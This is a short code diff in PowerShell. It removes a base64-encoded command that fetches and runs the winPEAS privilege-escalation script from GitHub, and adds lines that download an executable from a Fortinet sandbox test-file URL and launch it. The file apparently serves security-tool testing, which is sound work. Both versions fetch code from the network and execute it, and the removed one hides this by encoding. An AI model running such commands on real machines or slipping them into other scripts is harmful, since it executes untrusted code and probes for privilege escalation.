@@ -1,1 +1,6 @@
-powershell.exe -EncodedCommand aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHAAZQBhAHMAcwAtAG4AZwAvAFAARQBBAFMAUwAtAG4AZwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAcwB0AGUAcgAvAHcAaQBuAFAARQBBAFMALwB3AGkAbgBQAEUAQQBTAHAAcwAxAC8AdwBpAG4AUABFAEEAUwAuAHAAcwAxACcAKQA=
+$down = New-Object System.Net.WebClient
+$url  = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
+$file = 'windows.exe';
+$down.DownloadFile($url,$file);
+$exec = New-Object -com shell.application
+$exec.shellexecute($file);
